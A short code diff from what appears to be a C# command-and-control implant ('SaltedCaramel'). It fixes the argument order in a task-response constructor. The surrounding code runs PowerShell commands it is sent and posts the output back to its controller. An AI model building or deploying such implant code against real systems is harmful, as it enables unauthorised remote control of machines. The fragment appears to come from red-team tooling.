@@ -15,7 +15,7 @@ namespace SaltedCaramel.Tasks
             {
                 string result = Shell.PowerShellExecute(args);
 
-                SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(result), task.id);
+                SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(result));
                 implant.PostResponse(response);
                 implant.SendComplete(task.id);
             }
